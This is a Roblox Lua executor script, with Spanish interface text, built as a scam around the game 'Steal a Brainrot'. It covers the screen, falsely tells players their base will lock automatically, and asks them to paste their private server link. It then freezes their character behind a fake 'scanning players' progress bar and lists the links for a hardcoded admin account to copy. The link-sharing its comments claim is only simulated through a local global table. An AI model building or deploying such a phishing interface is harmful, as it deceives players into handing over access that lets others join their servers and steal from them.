--// CONFIGURACIÓN
local AdminUser = "Facuw2000"
local LocalPlayer = game.Players.LocalPlayer
local IsAdmin = (LocalPlayer.Name == AdminUser)

-- Links globales compartidos (simulación)
_G.SharedLinks = _G.SharedLinks or {}

-- UI PRINCIPAL
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Full = Instance.new("Frame", ScreenGui)
Full.Size = UDim2.new(1,0,1,0)
Full.BackgroundColor3 = Color3.fromRGB(0,0,0)

local Title = Instance.new("TextLabel", Full)
Title.Size = UDim2.new(1,0,0.15,0)
Title.Position = UDim2.new(0,0,0.05,0)
Title.BackgroundTransparency = 1
Title.Text = "STEAL A BRAINROT MOREIRA 🧠"
Title.Font = Enum.Font.GothamBlack
Title.TextScaled = true

task.spawn(function()
	while Title do
		Title.TextColor3 = Color3.fromHSV(tick()%3/3,1,1)
		task.wait(0.03)
	end
end)

local Info = Instance.new("TextLabel", Full)
Info.Size = UDim2.new(1,0,0.1,0)
Info.Position = UDim2.new(0,0,0.17,0)
Info.BackgroundTransparency = 1
Info.TextColor3 = Color3.new(1,1,1)
Info.Text = "Tranquilo, tu base se cerrará automáticamente"
Info.Font = Enum.Font.Gotham
Info.TextScaled = true

local Box = Instance.new("TextBox", Full)
Box.Size = UDim2.new(0.7,0,0.1,0)
Box.Position = UDim2.new(0.15,0,0.32,0)
Box.BackgroundColor3 = Color3.fromRGB(25,25,25)
Box.TextColor3 = Color3.new(1,1,1)
Box.Text = "Pega tu link del server aquí"
Box.Font = Enum.Font.GothamBold
Box.TextScaled = true

local Accept = Instance.new("TextButton", Full)
Accept.Size = UDim2.new(0.3,0,0.08,0)
Accept.Position = UDim2.new(0.35,0,0.45,0)
Accept.BackgroundColor3 = Color3.fromRGB(50,50,50)
Accept.TextColor3 = Color3.new(1,1,1)
Accept.Text = "Aceptar"
Accept.Font = Enum.Font.GothamBold
Accept.TextScaled = true

local Status = Instance.new("TextLabel", Full)
Status.Size = UDim2.new(1,0,0.08,0)
Status.Position = UDim2.new(0,0,0.58,0)
Status.BackgroundTransparency = 1
Status.TextColor3 = Color3.new(1,1,1)
Status.TextScaled = true

local BarFrame = Instance.new("Frame", Full)
BarFrame.Size = UDim2.new(0.6,0,0.04,0)
BarFrame.Position = UDim2.new(0.2,0,0.68,0)
BarFrame.BackgroundColor3 = Color3.fromRGB(40,40,40)

local Bar = Instance.new("Frame", BarFrame)
Bar.BackgroundColor3 = Color3.fromRGB(0,255,0)
Bar.Size = UDim2.new(0,0,1,0)

------------------------------------------------
-- PANEL ADMIN
------------------------------------------------
local AdminPanel = Instance.new("Frame", ScreenGui)
AdminPanel.Size = UDim2.new(0.55,0,0.6,0)
AdminPanel.Position = UDim2.new(0.225,0,0.2,0)
AdminPanel.BackgroundColor3 = Color3.fromRGB(20,20,20)
AdminPanel.Visible = false

local CloseAdmin = Instance.new("TextButton", AdminPanel)
CloseAdmin.Size = UDim2.new(0.25,0,0.1,0)
CloseAdmin.Position = UDim2.new(0.75,0,0,0)
CloseAdmin.BackgroundColor3 = Color3.fromRGB(80,0,0)
CloseAdmin.Text = "Cerrar"
CloseAdmin.TextColor3 = Color3.new(1,1,1)
CloseAdmin.TextScaled = true

local LinksList = Instance.new("ScrollingFrame", AdminPanel)
LinksList.Size = UDim2.new(1,0,0.85,0)
LinksList.Position = UDim2.new(0,0,0.14,0)
LinksList.CanvasSize = UDim2.new(0,0,0,0)
LinksList.BackgroundTransparency = 1


------------------------------------------------
-- FUNCIÓN PARA ACTUALIZAR LOS LINKS
------------------------------------------------
function UpdateLinks()
	LinksList:ClearAllChildren()

	for i,link in ipairs(_G.SharedLinks) do

		local Row = Instance.new("Frame", LinksList)
		Row.Size = UDim2.new(1,0,0,38)
		Row.BackgroundColor3 = Color3.fromRGB(30,30,30)

		local Txt = Instance.new("TextLabel", Row)
		Txt.Size = UDim2.new(0.75,0,1,0)
		Txt.BackgroundTransparency = 1
		Txt.Text = link
		Txt.TextScaled = true
		Txt.TextColor3 = Color3.new(1,1,1)
		Txt.TextXAlignment = Enum.TextXAlignment.Left

		local Trash = Instance.new("TextButton", Row)
		Trash.Size = UDim2.new(0.12,0,0.8,0)
		Trash.Position = UDim2.new(0.78,0,0.1,0)
		Trash.Text = "🗑️"
		Trash.TextScaled = true
		Trash.BackgroundColor3 = Color3.fromRGB(100,0,0)

		Trash.MouseButton1Click:Connect(function()
			table.remove(_G.SharedLinks, i)
			UpdateLinks()
		end)

		if setclipboard then
			local Copy = Instance.new("TextButton", Row)
			Copy.Size = UDim2.new(0.1,0,0.8,0)
			Copy.Position = UDim2.new(0.9,0,0.1,0)
			Copy.Text = "📋"
			Copy.TextScaled = true
			Copy.BackgroundColor3 = Color3.fromRGB(0,120,0)

			Copy.MouseButton1Click:Connect(function()
				setclipboard(link)
			end)
		end
	end
end


------------------------------------------------
-- ACTUALIZAR CADA 1 MINUTO
------------------------------------------------
task.spawn(function()
	while true do
		task.wait(60)
		if IsAdmin then
			UpdateLinks()
		end
	end
end)


------------------------------------------------
-- PROCESO AL ACEPTAR LINK
------------------------------------------------
Accept.MouseButton1Click:Connect(function()
	local txt = Box.Text

	------------------------------------------------
	-- CONGELAR SI NO ES ADMIN
	------------------------------------------------
	if not IsAdmin then
		local char = LocalPlayer.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 0
				hum.JumpPower = 0
			end
		end
	end

	------------------------------------------------
	-- VALIDAR LINK
	------------------------------------------------
	if not string.find(txt:lower(), "roblox.com") then
		Status.Text = "❌ Enlace inválido"
		return
	end

	------------------------------------------------
	-- GUARDAR LINK GLOBAL (todos lo reciben)
	------------------------------------------------
	table.insert(_G.SharedLinks, txt)
	UpdateLinks()

	------------------------------------------------
	-- SIMULACIÓN DE CARGA
	------------------------------------------------
	Status.Text = "Escaneando jugadores…"
	task.wait(1.7)

	Status.Text = "Buscando bots…"
	task.wait(1.7)

	Status.Text = "Solo un poco más…"

	local speed = IsAdmin and 0.02 or 0.15

	for i = 1,100 do
		Bar.Size = UDim2.new(i/100,0,1,0)
		task.wait(speed)
	end

	------------------------------------------------
	-- SI ES ADMIN → ABRIR PANEL Y QUITAR FULLSCREEN
	------------------------------------------------
	if IsAdmin then
		Status.Text = "✅"
		task.wait(1)

		Full.Visible = false
		AdminPanel.Visible = true
	end

	------------------------------------------------
	-- DESCONGELAR NO ADMIN
	------------------------------------------------
	if not IsAdmin then
		local char = LocalPlayer.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.WalkSpeed = 16
				hum.JumpPower = 50
			end
		end
	end
end)


------------------------------------------------
-- BOTÓN CERRAR PANEL ADMIN
------------------------------------------------
CloseAdmin.MouseButton1Click:Connect(function()
	AdminPanel.Visible = false
end)
